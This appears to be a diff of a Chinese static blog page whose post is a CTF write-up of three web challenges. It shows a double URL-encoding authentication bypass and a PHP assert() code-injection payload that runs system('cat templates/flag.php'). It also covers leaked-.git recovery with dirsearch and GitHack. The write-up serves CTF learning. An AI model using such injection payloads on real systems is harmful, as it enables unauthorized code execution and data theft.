@@ -511,7 +511,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="42">
-<input type="hidden" id="yelog_site_word_count" value="93.1k">
+<input type="hidden" id="yelog_site_word_count" value="92k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -876,18 +876,18 @@
         </a>
         
         <a  class="全部文章 CTF刷题 Crypto "
-           href="/2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"
-           data-tag="Crypto"
-           data-author="" >
-            <span class="post-title" title="Bugku密码学（一）">Bugku密码学（一）</span>
-            <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
-        </a>
-        
-        <a  class="全部文章 CTF刷题 Crypto "
            href="/2019/07/14/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E5%AF%86%E7%A0%81%E5%AD%A6/"
            data-tag="Crypto"
            data-author="" >
             <span class="post-title" title="实验吧--密码学">实验吧--密码学</span>
+            <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
+        </a>
+        
+        <a  class="全部文章 CTF刷题 Crypto "
+           href="/2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"
+           data-tag="Crypto"
+           data-author="" >
+            <span class="post-title" title="Bugku密码学（一）">Bugku密码学（一）</span>
             <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
         </a>
         
@@ -1070,7 +1070,7 @@
     </div>
     <div class="article-meta">
         
-        <span>字数:932</span>
+        <span>字数:880</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1111,35 +1111,67 @@
 <p><strong>1、ics-06</strong><br><img src="http://img-blog.csdnimg.cn/20191013201933147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目，一个看起来看来很炫酷的页面，瞎点一会发现只有一个报表中心可以进<br><img src="http://img-blog.csdnimg.cn/20191013203721575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一开始以为是sql注入题，尝试了一会发现不是，这题考察的是爆破，当id=2333时，得到flag。</p>
 <p><img src="http://img-blog.csdnimg.cn/20191013212440794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><strong>2、PHP2</strong><br><img src="http://img-blog.csdnimg.cn/20191015191306595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目，御剑扫描，如果扫不到就说明你字典里需要添上了。<br><img src="http://img-blog.csdnimg.cn/20191015191627512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现index.phps源码泄露，打开网页：<br><img src="http://img-blog.csdnimg.cn/20191015192041765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>即：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&quot;admin&quot;&#x3D;&#x3D;&#x3D;$_GET[id]) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;admin&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+if(&quot;admin&quot;===$_GET[id]) &#123;
+  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
+  exit();
+&#125;
+
+$_GET[id] = urldecode($_GET[id]);
+if($_GET[id] == &quot;admin&quot;)
+&#123;
+  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
+  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;
+&#125;
+?&gt;
+
+Can you anthenticate to this website?</code></pre>
 <p>审计下代码，发现 要得到flag要满足两个条件<br>一，要使<code>&quot;admin&quot;===$_GET[id]</code>不成立<br>二，经过<code>$_GET[id] = urldecode($_GET[id]);</code>，使得<code>$_GET[id] == &quot;admin&quot;</code>成立。</p>
 <h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p>1、Url的编码格式采用的是ASCII码(16进制) 不能在Url中包含任何非ASCII字符，例如中文，如果Url中含有非ASCII字符的话, 浏览器会对Url进行urlencode，然后发送给服务器</p>
 <p>2、关于<code>urldecode/urlencode</code>函数：<br>当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urlencode<br>然后在这段代码中运行时，会自动进行一次urldecode<br>在urldecode()函数中，再一次进行一次解码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">urldecode(%2561)&#x3D;%61</span><br><span class="line">urldecode(%61)&#x3D;a</span><br></pre></td></tr></table></figure>
+<pre><code>urldecode(%2561)=%61
+urldecode(%61)=a</code></pre>
 <p>当第一次比较时，实际是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(&quot;admin&quot;&#x3D;&#x3D;&#x3D;&quot;%61dmin&quot;) </span><br></pre></td></tr></table></figure>
-
+<pre><code>if(&quot;admin&quot;===&quot;%61dmin&quot;) </code></pre>
 <p>而经过<code>$_GET[id] = urldecode($_GET[id]);</code></p>
 <p>第二次比较是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(&quot;admin&quot; &#x3D;&#x3D; &quot;admin&quot;);</span><br></pre></td></tr></table></figure>
+<pre><code>if(&quot;admin&quot; == &quot;admin&quot;);</code></pre>
 <p>故构造:<br><code>?id=%2561dmin</code></p>
 <p>得到flag<br><img src="http://img-blog.csdnimg.cn/20191015201013128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3、mfw</strong><br>打开题目，是一个网站：<br><img src="http://img-blog.csdnimg.cn/20191015202250382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>随便翻翻，发现这个页面<br><img src="http://img-blog.csdnimg.cn/2019101520294454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>怀疑存在源码泄露，用dirsearch扫描一下，发现git源码泄露：</p>
 <p><img src="http://img-blog.csdnimg.cn/2019101520374553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。<br>用法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.py -u 目标网址 -e *(指定语言，也可以不指定为*)</span><br></pre></td></tr></table></figure>
+<pre><code>dirsearch.py -u 目标网址 -e *(指定语言，也可以不指定为*)</code></pre>
 <p>详细请看：<code>https://www.freebuf.com/column/153277.html</code><br>果然存在git源码泄露；</p>
 <p>利用GitHack下载源码<br>关于GitHack一个git泄露利用脚本，很好用~<br>详细请看<code>https://www.freebuf.com/sectool/66096.html</code><br>常用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 GitHack.py url&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+<pre><code>python27 GitHack.py url/.git/</code></pre>
 <p><img src="http://img-blog.csdnimg.cn/20191015204333899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载完成，得到一个以url命名的文件夹；打开发现有flag.php但里面没东西；<br>查看index.php文件：<br><img src="http://img-blog.csdnimg.cn/20191015205219293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到了关键代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">	$page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page &#x3D; &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; I heard &#39;..&#39; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+
+if (isset($_GET[&#39;page&#39;])) &#123;
+    $page = $_GET[&#39;page&#39;];
+&#125; else &#123;
+    $page = &quot;home&quot;;
+&#125;
+
+$file = &quot;templates/&quot; . $page . &quot;.php&quot;;
+
+// I heard &#39;..&#39; is dangerous!
+assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);
+
+// TODO: Make this look nice
+assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);
+
+?&gt;</code></pre>
 <p>分析代码可知，<br>若想得到flag，即得到”Detected hacking attempt!”<br>则需要给page传入的须满足</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;)</span><br></pre></td></tr></table></figure>
+<pre><code>$file = &quot;templates/&quot; . $page . &quot;.php&quot;;
+assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;)</code></pre>
 <p>尝试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;abc&#39;) or system(&quot;cat templates&#x2F;flag.php&quot;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<pre><code>?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//</code></pre>
 <p>即</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file &#x3D; &quot;templates&#x2F;?page&#x3D;abc&#39;) or system(&quot;cat templates&#x2F;flag.php&quot;);&#x2F;&#x2F;.php&quot;;</span><br></pre></td></tr></table></figure>
+<pre><code>$file = &quot;templates/?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//.php&quot;;</code></pre>
 <p>即传<code>?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//</code></p>
 <p>拼成下面语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(&quot;strpos(&#39;templates&#x2F;?page&#x3D;abc&#39;) or system(&quot;cat templates&#x2F;flag.php&quot;);&#x2F;&#x2F;.php&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or</span><br><span class="line">die(&quot;Detected hacking attempt!&quot;);</span><br></pre></td></tr></table></figure>
+<pre><code>assert(&quot;strpos(&#39;templates/?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//.php&#39;, &#39;..&#39;) === false&quot;) or
+die(&quot;Detected hacking attempt!&quot;);</code></pre>
 <p>F12 得到flag<br><img src="http://img-blog.csdnimg.cn/20191015205840114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>assert() 函数：<br>用来判断一个表达式是否成立。返回true or false<br>详细：<code>https://www.cnblogs.com/yuerdongni/archive/2013/10/12/3364954.html</code><br>strpos()函数：<br><img src="http://img-blog.csdnimg.cn/20191015210633922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考文章：<code>https://blog.csdn.net/wyj_1216/article/details/95218671</code></p>
 
       
